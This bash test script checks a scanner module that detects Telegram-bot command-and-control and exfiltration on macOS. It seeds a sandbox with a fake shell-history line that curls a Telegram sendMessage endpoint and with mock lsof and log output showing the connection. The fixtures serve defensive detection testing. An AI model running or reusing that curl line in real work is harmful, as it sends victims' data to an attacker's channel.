#!/usr/bin/env bash
set -e
source "$(dirname "$0")/helpers.sh"

setup_sandbox
setup_mock_bin
export INFOSTEALER_SCAN_PATHS="$HOME/Downloads:$HOME/Library/Caches"

cat > "$HOME/.bash_history" <<'EOF'
curl https://api.telegram.org/bot123456789:ABC/sendMessage
EOF
mkdir -p "$HOME/Downloads"
cat > "$HOME/Downloads/telegram.txt" <<'EOF'
https://api.telegram.org/bot123456789:ABC/sendMessage
EOF

cat > "$SANDBOX/mockbin/lsof" <<'EOF'
#!/usr/bin/env bash
if printf '%s ' "$@" | grep -q -- '-nP'; then
    printf '%s\n' 'python3 4242 tester 10u IPv4 0t0 TCP 10.0.0.5:51515->149.154.167.220:443 (ESTABLISHED)'
else
    printf '%s\n' 'python3 4242 tester 10u IPv4 0t0 TCP host:51515->api.telegram.org:https (ESTABLISHED)'
fi
EOF
chmod +x "$SANDBOX/mockbin/lsof"

cat > "$SANDBOX/mockbin/log" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' '2026-04-02 12:00:00 tester api.telegram.org resolved'
EOF
chmod +x "$SANDBOX/mockbin/log"

output=$(bash "$REPO_ROOT/modules/exfiltration/T1071.001-telegram-c2.sh" 2>&1) || true
assert_detected "T1071.001" "$output"
assert_contains "api.telegram.org" "$output"
assert_contains "149.154." "$output"
teardown_sandbox

setup_sandbox
setup_mock_bin
export INFOSTEALER_SCAN_PATHS="$HOME/Downloads:$HOME/Library/Caches"
cat > "$SANDBOX/mockbin/lsof" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod +x "$SANDBOX/mockbin/lsof"
cat > "$SANDBOX/mockbin/log" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod +x "$SANDBOX/mockbin/log"

output=$(bash "$REPO_ROOT/modules/exfiltration/T1071.001-telegram-c2.sh" 2>&1) || true
assert_clean "T1071.001" "$output"
teardown_sandbox

echo "PASS"
exit 0
